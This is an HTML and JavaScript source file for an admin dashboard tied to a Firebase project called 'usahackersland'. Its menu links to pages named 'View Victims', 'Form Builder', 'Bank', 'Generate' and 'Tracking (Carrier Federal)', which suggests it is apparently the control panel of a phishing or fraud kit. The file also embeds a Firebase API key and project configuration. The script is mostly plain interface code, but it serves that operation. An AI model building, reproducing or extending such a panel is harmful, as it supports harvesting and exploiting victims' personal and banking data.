<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin Dashboard</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <style>
    body {
      margin: 0; 
      font-family: Arial, sans-serif; 
      background: #222; /* default dark */
      color: white;
      transition: background 0.5s ease;
      position: relative;
      min-height: 100vh;
    }
    .header {
      background: #222; 
      color: #fff; 
      padding: 10px; 
      text-align: center; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      gap: 15px;
      position: relative;
      z-index: 10;
    }
    .header img {
      height: 50px;
    }
    .bg-theme-wrapper {
      background: #333;
      padding: 10px;
      text-align: center;
      z-index: 10;
      position: relative;
    }
    label {
      font-weight: bold;
      margin-right: 8px;
      user-select: none;
    }
    select {
      padding: 5px; 
      border-radius: 4px; 
      border: none;
      background: #555;
      color: white;
      font-size: 1rem;
      cursor: pointer;
    }
    #bgInput {
      margin-left: 10px;
      vertical-align: middle;
    }
    .nav {
      background: #333; 
      display: flex; 
      flex-wrap: wrap; 
      justify-content: center; 
      gap: 10px; 
      padding: 10px;
      position: relative;
      z-index: 10;
    }
    .nav a {
      color: white; 
      text-decoration: none; 
      font-weight: bold; 
      background: #444; 
      padding: 8px 15px; 
      border-radius: 5px;
      user-select: none;
    }
    .nav a:hover {
      background: #555;
    }
    iframe {
      width: 100%; 
      height: 80vh; 
      border: none;
      position: relative;
      z-index: 5;
    }
    .logo-upload {
      background: #fff; 
      padding: 10px; 
      text-align: center;
      color: #222;
      position: relative;
      z-index: 10;
    }

    /* Gradient animation */
    @keyframes gradientBG {
      0% {background-position:0% 50%}
      50% {background-position:100% 50%}
      100% {background-position:0% 50%}
    }
    /* Canvas covers entire background */
    #bgCanvas {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      z-index: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="header">
    <img id="dashboardLogo" src="logo.png" alt="Logo" />
    <h1>Admin Dashboard</h1>
  </div>

  <div class="bg-theme-wrapper">
    <label for="bgThemeSelect">üñºÔ∏è Change Background:</label>
    <select id="bgThemeSelect">
      <option value="none">None</option>
      <option value="gradient">Animated Gradient</option>
      <option value="stars">Starfield</option>
      <option value="waves">Waves</option>
      <option value="circles">Moving Circles</option>
      <option value="custom">Custom Upload</option>
    </select>
    <input type="file" id="bgInput" accept="image/*" style="display:none;" />
  </div>

  <div class="nav">
    <a href="#" onclick="loadPage('form-builder')">üé® Form Builder</a>
    <a href="#" onclick="loadPage('forms')">üíæ Saved Forms</a>
    <a href="#" onclick="loadPage('feedback')">üìù Feedback</a>
    <a href="#" onclick="loadPage('victims')">üß† View Victims</a>
    <a href="#" onclick="loadPage('members')">üë• Members</a>
    <a href="#" onclick="loadPage('links')">üîó Links</a>
    <a href="#" onclick="loadPage('generate')">üßæ Generate</a>
    <a href="#" onclick="loadPage('bank')">üè¶ Bank</a>
    <a href="#" onclick="loadPage('tracking')">üì¶ Tracking (Carrier Federal)</a>
  </div>

  <div class="logo-upload">
    <h3>üì∑ Change Platform Logo (Admin Only)</h3>
    <input type="file" id="logoInput" accept="image/*" />
  </div>

  <iframe id="iframePage" src="Social-media-links/build.html"></iframe>

  <script>
    // Firebase config and initialization
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    auth.onAuthStateChanged(async (user) => {
      if (!user) {
        window.location.href = "login.html";
        return;
      }

      try {
        const docSnap = await db.collection("users").doc(user.uid).get();
        if (!docSnap.exists) {
          alert("No user record found. Contact support.");
          return auth.signOut();
        }
        const userData = docSnap.data();

        if (userData.role !== "admin") {
          return window.location.href = "dashboard.html";
        }
      } catch (err) {
        console.error(err);
      }
    });

    const base = "Social-media-links/";

    function loadPage(page) {
      const iframe = document.getElementById("iframePage");
      const pages = {
        'form-builder': "build.html",
        'forms': "forms.html",
        'feedback': "feedback.html",
        'victims': "victims.html",
        'members': "members.html",
        'links': "links.html",
        'generate': "generate.html",
        'bank': "bank.html",
        'tracking': "tracking.html"
      };
      iframe.src = base + (pages[page] || "build.html");
    }

    // Logo upload & persist
    const logoInput = document.getElementById('logoInput');
    const dashboardLogo = document.getElementById('dashboardLogo');

    logoInput.addEventListener('change', function (e) {
      const file = e.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = function (event) {
          const logoURL = event.target.result;
          dashboardLogo.src = logoURL;
          localStorage.setItem('platformLogo', logoURL);
        };
        reader.readAsDataURL(file);
      }
    });

    const savedLogo = localStorage.getItem('platformLogo');
    if (savedLogo) {
      dashboardLogo.src = savedLogo;
    }

    // Background themes
    const bgThemeSelect = document.getElementById('bgThemeSelect');
    const bgInput = document.getElementById('bgInput');

    function clearBackground() {
      document.body.style.background = '';
      document.body.style.backgroundImage = '';
      document.body.style.animation = '';
      // Remove canvas if exists
      const canvas = document.getElementById('bgCanvas');
      if (canvas) canvas.remove();
    }

    function createStarsBackground() {
      if (document.getElementById('bgCanvas')) return;

      const canvas = document.createElement('canvas');
      canvas.id = 'bgCanvas';
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      canvas.style.position = 'fixed';
      canvas.style.top = 0;
      canvas.style.left = 0;
      canvas.style.width = '100vw';
      canvas.style.height = '100vh';
      canvas.style.zIndex = '0';
      canvas.style.pointerEvents = 'none';

      document.body.appendChild(canvas);

      const ctx = canvas.getContext('2d');
      const stars = [];
      const starCount = 120;

      function randomRange(min, max) {
        return Math.random() * (max - min) + min;
      }

      for (let i = 0; i < starCount; i++) {
        stars.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          radius: randomRange(0.5, 1.5),
          alpha: Math.random(),
          alphaChange: 0.01 + Math.random() * 0.02,
        });
      }

      function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        stars.forEach((star) => {
          star.alpha += star.alphaChange;
          if (star.alpha <= 0 || star.alpha >= 1) star.alphaChange *= -1;

          ctx.beginPath();
          ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
          ctx.fillStyle = `rgba(255,255,255,${star.alpha})`;
          ctx.fill();
        });
        requestAnimationFrame(animate);
      }
      animate();

      window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
      });
    }

    // Placeholder for waves or circles ‚Äî you can add your animations here
    function createWavesBackground() {
      // Not implemented yet
    }
    function createCirclesBackground() {
      // Not implemented yet
    }

    function applyBackgroundTheme(theme) {
      clearBackground();
      bgInput.style.display = 'none';

      switch (theme) {
        case 'gradient':
          document.body.style.background = "linear-gradient(-45deg, #ee7752, #e73c7e, #23d5ab, #23a6d5)";
          document.body.style.backgroundSize = "400% 400%";
          document.body.style.animation = "gradientBG 15s ease infinite";
          break;
        case 'stars':
          createStarsBackground();
          break;
        case 'waves':
          createWavesBackground();
          break;
        case 'circles':
          createCirclesBackground();
          break;
        case 'custom':
          bgInput.style.display = 'inline-block';
          const savedCustomBg = localStorage.getItem('adminBackground');
          if (savedCustomBg) {
            document.body.style.backgroundImage = `url(${savedCustomBg})`;
            document.body.style.backgroundSize = "cover";
            document.body.style.backgroundRepeat = "no-repeat";
            document.body.style.backgroundPosition = "center";
          }
          break;
        case 'none':
        default:
          document.body.style.background = '#222';
          break;
      }
    }

    // Animate gradient keyframes added dynamically above in CSS block

    bgThemeSelect.addEventListener('change', e => {
      const theme = e.target.value;
      localStorage.setItem('bgTheme', theme);
      applyBackgroundTheme(theme);
      if (theme !== 'custom') {
        localStorage.removeItem('adminBackground');
      }
    });

    bgInput.addEventListener('change', e => {
      const file = e.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = event => {
          const dataUrl = event.target.result;
          localStorage.setItem('adminBackground', dataUrl);
          document.body.style.backgroundImage = `url(${dataUrl})`;
          document.body.style.backgroundSize = "cover";
          document.body.style.backgroundRepeat = "no-repeat";
          document.body.style.backgroundPosition = "center";
        };
        reader.readAsDataURL(file);
      }
    });

    // On page load, apply saved theme
    window.addEventListener('load', () => {
      const savedTheme = localStorage.getItem('bgTheme') || 'gradient';
      bgThemeSelect.value = savedTheme;
      applyBackgroundTheme(savedTheme);

      const savedLogo = localStorage.getItem('platformLogo');
      if (savedLogo) {
        dashboardLogo.src = savedLogo;
      }
    });
  </script>
</body>
</html>
